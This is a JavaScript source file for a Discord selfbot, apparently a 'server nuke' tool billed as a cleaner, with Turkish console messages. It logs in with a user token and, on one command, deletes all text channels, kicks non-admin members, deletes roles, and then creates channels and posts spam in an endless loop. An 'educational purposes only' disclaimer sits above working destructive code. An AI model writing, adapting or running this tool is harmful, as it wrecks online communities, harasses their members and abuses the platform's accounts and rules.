// Henzy Self Patlatma v1.0 - Discord Server Cleaner Tool
// Created by: Henzy
// GitHub: https://github.com/henzy
// License: MIT
// 
// This tool is designed for educational purposes only.
// Use at your own risk. Discord ToS violation may result in account ban.

const { Client, GatewayIntentBits } = require('discord.js-selfbot-v13');
const readline = require('readline');

class DiscordSelfPatlatma {
    constructor() {
        this.client = new Client({
            checkUpdate: false,
            autoRedeemNitro: false,
            ws: { properties: { browser: 'Discord Client' } }
        });
        
        this.setupEventHandlers();
    }

    setupEventHandlers() {
        this.client.on('ready', () => {
            console.log('╔══════════════════════════════════════════════════════════════════════════════════╗');
            console.log('║                           Henzy Self Patlatma                                 ║');
            console.log('║                       Discord Server Cleaner Tool                             ║');
            console.log('╠══════════════════════════════════════════════════════════════════════════════════╣');
            console.log(`║ ✅ ${this.client.user.tag} (Kullanıcı Hesabı) olarak giriş yapıldı!                    ║`);
            console.log('║ 🎯 Komut prefix: .                                                              ║');
            console.log('║ 🎯 Komut kullanıldığı sunucu otomatik hedeflenecek                              ║');
            console.log('║ 🚀 Sunucu temizleme aracı hazır!                                                ║');
            console.log('║ ⚠️  Self-token kullanımı Discord ToS\'a aykırıdır!                              ║');
            console.log('║ ⚠️  Hesap banlanması riski vardır!                                              ║');
            console.log('╚══════════════════════════════════════════════════════════════════════════════════╝');
            console.log('');
            console.log('📋 Komutlar:');
            console.log('   .selam - bom :)');
            console.log('');
        });

        this.client.on('messageCreate', async (message) => {
            if (message.author.id !== this.client.user.id) return;
            if (!message.content.startsWith('.')) return;
            
            const command = message.content.toLowerCase();
            
            if (command === '.selam') {
                await this.handleSelamCommand(message);
            }
        });
    }

    async askQuestion(question) {
        return new Promise((resolve) => {
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            
            rl.question(question, (answer) => {
                rl.close();
                resolve(answer.trim());
            });
        });
    }

    async getConfigFromUser() {
        console.log('🚀 Discord Self Patlatma (Kullanıcı Hesabı) başlatılıyor...');
        console.log('⚠️  UYARI: Self-token kullanımı Discord ToS\'a aykırıdır!');
        console.log('⚠️  Hesap banlanması riski vardır!');
        console.log('');
        console.log('📋 Lütfen aşağıdaki bilgileri girin:');
        console.log('');
        console.log('🔐 Tool signed by Henzy - All rights reserved');
        console.log('📧 Contact: https://github.com/Henzy98');
        console.log('⭐ Star this repo if you found it useful!');
        console.log('');
        
        const token = await this.askQuestion('🔑 Discord self-token\'ınızı girin: ');
        const userId = await this.askQuestion('👤 Discord kullanıcı ID\'nizi girin: ');
        const channelName = await this.askQuestion('📝 Oluşturulacak kanal adını girin: ');
        const messageContent = await this.askQuestion('💬 Spam mesajını girin: ');
        
        console.log('');
        console.log('✅ Bilgiler alındı! Discord\'a bağlanılıyor...');
        console.log('');
        
        return {
            DISCORD_TOKEN: token,
            USER_ID: userId,
            CHANNEL_NAME: channelName,
            MESSAGE_CONTENT: messageContent,
            COMMAND_PREFIX: '.',
            DELAY: 500
        };
    }

    async handleSelamCommand(message) {
        if (!message.guild) {
            message.reply('❌ Bu komut sadece sunucularda kullanılabilir!');
            return;
        }

        const config = await this.getConfigFromUser();
        
        if (message.author.id !== config.USER_ID) {
            message.reply('❌ Bu komutu sadece yetkili kullanıcı kullanabilir!');
            return;
        }

        try {
            console.log(`🎯 ${message.guild.name} sunucusu temizleniyor...`);
            
            await this.cleanServer(message.guild, config);
            
            console.log('✅ Sunucu temizleme tamamlandı!');
            message.reply('✅ Sunucu temizleme tamamlandı!');
            
        } catch (error) {
            console.error('❌ Sunucu temizleme hatası:', error);
            message.reply('❌ Sunucu temizleme sırasında hata oluştu!');
        }
    }

    async cleanServer(guild, config) {
        const channels = guild.channels.cache.filter(ch => ch.type === 0);
        const roles = guild.roles.cache.filter(r => r.name !== '@everyone' && r.position < guild.me.roles.highest.position);
        const members = guild.members.cache.filter(m => !m.permissions.has('Administrator') && m.id !== guild.ownerId);

        console.log(`🗑️  ${channels.size} kanal siliniyor...`);
        await Promise.all(channels.map(ch => ch.delete().catch(() => {})));

        console.log(`👥 ${members.size} üye atılıyor...`);
        await Promise.all(members.map(m => m.kick().catch(() => {})));

        console.log(`🏷️  ${roles.size} rol siliniyor...`);
        await Promise.all(roles.map(r => r.delete().catch(() => {})));

        console.log('🚀 Spam kanalları oluşturuluyor...');
        await this.createSpamChannels(guild, config);
    }

    async createSpamChannels(guild, config) {
        let channelCount = 0;
        
        const createAndSpam = async () => {
            try {
                const newChannel = await guild.channels.create({
                    name: config.CHANNEL_NAME,
                    type: 0
                });
                
                channelCount++;
                console.log(`📝 Kanal oluşturuldu: ${newChannel.name} (${channelCount})`);
                
                await newChannel.send(config.MESSAGE_CONTENT);
                await this.sleep(200);
                
            } catch (error) {
                console.error('❌ Kanal oluşturulamadı:', error);
                await this.sleep(1000);
            }
        };

        while (true) {
            await createAndSpam();
            await this.sleep(config.DELAY);
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async start() {
        try {
            const config = await this.getConfigFromUser();
            this.config = config;
            
            console.log(`🔒 Sadece ${config.USER_ID} ID'li kullanıcı komutları kullanabilir!`);
            console.log('');
            
            await this.client.login(config.DISCORD_TOKEN);
            
        } catch (error) {
            console.error('❌ Başlatma hatası:', error);
            console.log('⏳ Çıkmak için herhangi bir tuşa basın...');
            
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            
            rl.question('', () => {
                rl.close();
                process.exit(1);
            });
        }
    }
}

const patlatma = new DiscordSelfPatlatma();
patlatma.start();

process.on('SIGINT', () => {
    console.log('\n👋 Uygulama kapatılıyor...');
    process.exit(0);
});

process.on('unhandledRejection', (error) => {
    console.error('❌ İşlenmeyen hata:', error);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Yakalanmamış hata:', error);
});
